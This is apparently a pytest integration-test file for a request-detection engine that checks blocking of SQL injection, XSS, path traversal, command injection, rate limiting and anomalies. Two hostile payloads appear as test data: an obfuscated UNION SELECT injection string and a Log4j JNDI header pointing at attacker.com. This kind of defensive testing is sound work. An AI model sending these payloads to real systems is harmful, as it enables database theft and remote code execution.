"""
Integration tests for the main DetectionEngine.
"""

from __future__ import annotations

import pytest

from src.config import Decision, ThreatLevel
from src.engine.detector import DetectionEngine


class TestDetectionEngine:
    """Integration tests for the complete detection pipeline."""
    
    def test_legit_request_allows(self, detection_engine: DetectionEngine, legit_request: dict):
        """Should ALLOW legitimate requests."""
        result = detection_engine.analyze(**legit_request)
        
        assert result.is_threat is False
        assert result.threat_level == ThreatLevel.SAFE
        assert result.recommendation == Decision.ALLOW
        assert len(result.matched_rules) == 0
    
    def test_sqli_blocks(self, detection_engine: DetectionEngine, sqli_request: dict):
        """Should BLOCK SQL injection attempts."""
        result = detection_engine.analyze(**sqli_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.BLOCK
        assert result.threat_level in (ThreatLevel.CRITICAL, ThreatLevel.HIGH)
        assert len(result.matched_rules) > 0
        
        attack_types = {r["attack_type"] for r in result.matched_rules}
        assert "SQL_INJECTION" in attack_types
    
    def test_xss_blocks(self, detection_engine: DetectionEngine, xss_request: dict):
        """Should BLOCK XSS attempts."""
        result = detection_engine.analyze(**xss_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.BLOCK
        assert len(result.matched_rules) > 0
        
        attack_types = {r["attack_type"] for r in result.matched_rules}
        assert "XSS" in attack_types
    
    def test_path_traversal_blocks(self, detection_engine: DetectionEngine, path_traversal_request: dict):
        """Should BLOCK path traversal attempts."""
        result = detection_engine.analyze(**path_traversal_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.BLOCK
        assert len(result.matched_rules) > 0
        
        attack_types = {r["attack_type"] for r in result.matched_rules}
        assert "PATH_TRAVERSAL" in attack_types
    
    def test_command_injection_blocks(self, detection_engine: DetectionEngine, cmdi_request: dict):
        """Should BLOCK command injection attempts."""
        result = detection_engine.analyze(**cmdi_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.BLOCK
        assert len(result.matched_rules) > 0
        
        attack_types = {r["attack_type"] for r in result.matched_rules}
        assert "COMMAND_INJECTION" in attack_types
    
    def test_rate_limit_blocks(self, detection_engine: DetectionEngine, legit_request: dict):
        """Should BLOCK when rate limit is exceeded."""
        ip = legit_request["ip_address"]
        
        for _ in range(5):
            result = detection_engine.analyze(**legit_request)
            assert result.recommendation == Decision.ALLOW
        
        result = detection_engine.analyze(**legit_request)
        assert result.recommendation == Decision.BLOCK
        assert result.triggering_factor == "rate_limit"
    
    def test_anomaly_flags(self, detection_engine: DetectionEngine):
        """Should FLAG requests with anomalous features."""
        anomalous_request = {
            "method": "GET",
            "url": "/" + "a" * 500,
            "headers": {},
            "body": "x" * 1000,
            "ip_address": "10.10.10.10",
        }
        
        result = detection_engine.analyze(**anomalous_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.FLAG
        assert result.anomaly_scores["anomaly_count"] >= 2
    
    def test_result_structure(self, detection_engine: DetectionEngine, legit_request: dict):
        """Should return properly structured results."""
        result = detection_engine.analyze(**legit_request)
        
        result_dict = result.to_dict()
        
        assert "is_threat" in result_dict
        assert "threat_level" in result_dict
        assert "recommendation" in result_dict
        assert "matched_rules" in result_dict
        assert "rate_limit_status" in result_dict
        assert "anomaly_scores" in result_dict
        assert "features" in result_dict
        assert "reason" in result_dict
        assert "triggering_factor" in result_dict
    
    def test_empty_body_handling(self, detection_engine: DetectionEngine):
        """Should handle empty body gracefully."""
        result = detection_engine.analyze(
            method="GET",
            url="/api/test",
            headers={},
            body="",
            ip_address="192.168.1.1",
        )
        
        assert result.features["body_length"] == 0.0
    
    def test_missing_headers_handling(self, detection_engine: DetectionEngine):
        """Should handle missing headers gracefully."""
        result = detection_engine.analyze(
            method="GET",
            url="/api/test",
            headers={},
            body="",
            ip_address="192.168.1.1",
        )
        
        assert result.features["header_count"] == 0.0
    
    def test_complex_sqli_evasion(self, detection_engine: DetectionEngine):
        """Should detect SQLi with common evasion techniques."""
        evasion_request = {
            "method": "POST",
            "url": "/api/login",
            "headers": {},
            "body": "{'user': 'admin'/**/UNION/**/SELECT/**/*/**/FROM/**/users--'}",
            "ip_address": "10.0.0.50",
        }
        
        result = detection_engine.analyze(**evasion_request)
        
        assert result.is_threat is True
        sqli_rules = [r for r in result.matched_rules if r["attack_type"] == "SQL_INJECTION"]
        assert len(sqli_rules) > 0
    
    def test_log4j_in_headers(self, detection_engine: DetectionEngine):
        """Should detect Log4j in headers."""
        log4j_request = {
            "method": "GET",
            "url": "/api/test",
            "headers": {
                "x-custom-header": "${jndi:ldap://attacker.com/a}",
            },
            "body": "",
            "ip_address": "10.0.0.60",
        }
        
        result = detection_engine.analyze(**log4j_request)
        
        assert result.is_threat is True
        assert result.recommendation == Decision.BLOCK
    
    def test_rule_access(self, detection_engine: DetectionEngine):
        """Should allow access to signature engine for rule management."""
        rules = detection_engine.signature_engine.rules
        assert len(rules) > 0
        
        import re
        from src.config import AttackType, Severity
        from src.rules.models import SignatureRule
        
        detection_engine.signature_engine.add_rule(
            SignatureRule(
                id="TEST-001",
                name="Test Rule",
                pattern=re.compile(r"test_pattern"),
                severity=Severity.MEDIUM,
                description="Test",
                attack_type=AttackType.UNKNOWN,
            )
        )
        
        assert len(detection_engine.signature_engine.rules) > len(rules)
